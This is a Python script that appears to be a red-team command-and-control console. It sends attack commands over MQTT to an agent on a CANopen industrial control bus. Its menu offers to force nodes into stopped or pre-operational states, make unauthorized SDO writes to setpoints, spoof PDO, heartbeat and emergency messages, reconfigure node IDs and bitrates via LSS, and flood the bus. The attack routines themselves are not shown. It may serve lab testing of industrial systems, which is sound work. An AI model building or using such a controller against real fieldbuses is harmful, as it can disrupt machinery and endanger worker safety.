#!/usr/bin/env python3
import paho.mqtt.client as mqtt

BROKER_HOST = "10.0.0.99"
BROKER_PORT = 1883
CMD_TOPIC = "redteam/cmd"
STATUS_TOPIC = "redteam/status"

MENU = [
    ("--- NMT state manipulation ---", None),
    ("1", ("Force victim into PRE-OPERATIONAL", "nmt_preop")),
    ("2", ("Force victim into STOPPED", "nmt_stop")),
    ("3", ("Reset victim node", "nmt_reset")),
    ("--- SDO abuse ---", None),
    ("4", ("Unauthorized READ of 0x1017 (read-only)", "sdo_read_ro")),
    ("5", ("Unauthorized WRITE to 0x6001 setpoint", "sdo_write_sp")),
    ("6", ("WRITE to 0x1017 (should be refused)", "sdo_write_ro")),
    ("7", ("SDO request flood", "sdo_flood")),
    ("--- PDO injection ---", None),
    ("8", ("Single spoofed TPDO1 (0x181)", "pdo_spoof")),
    ("9", ("Continuous PDO injection flood", "pdo_flood")),
    ("--- Heartbeat manipulation ---", None),
    ("10", ("Spoof victim heartbeat (false state)", "hb_spoof")),
    ("11", ("Ghost-node heartbeat (fake node)", "hb_ghost")),
    ("--- EMCY injection ---", None),
    ("12", ("Single fake EMCY (generic comm error)", "emcy_fake")),
    ("13", ("Fake EMCY (overvoltage 0x3210)", "emcy_overvolt")),
    ("14", ("EMCY flood", "emcy_flood")),
    ("--- LSS abuse ---", None),
    ("15", ("LSS: switch config + set node-ID", "lss_switch")),
    ("16", ("LSS: switch config + set bitrate", "lss_bitrate")),
    ("--- Bus-level DoS ---", None),
    ("17", ("High-priority bus saturation flood", "dos_flood")),
    ("--- Control ---", None),
    ("0", ("STOP current continuous attack", "stop")),
]

COMMANDS = {key: val[1] for key, val in MENU if val is not None}


def on_message(client, userdata, msg):
    print(f"[STATUS] {msg.payload.decode()}")


def print_menu():
    print("\n========== Red Team C2 ==========")
    for key, val in MENU:
        if val is None:
            print(f"\n{key}")
        else:
            desc, _ = val
            print(f" {key:>2}) {desc}")
    print("  q) Quit")


def main():
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.on_message = on_message
    client.connect(BROKER_HOST, BROKER_PORT, 60)
    client.subscribe(STATUS_TOPIC)
    client.loop_start()

    while True:
        print_menu()
        ch = input("> ").strip()
        if ch == "q":
            break
        if ch in COMMANDS:
            cmd = COMMANDS[ch]
            client.publish(CMD_TOPIC, cmd, qos=1)
            print(f"[C2] Sent: {cmd}")
        else:
            print("[C2] Invalid choice")

    client.loop_stop()


if __name__ == "__main__":
    main()
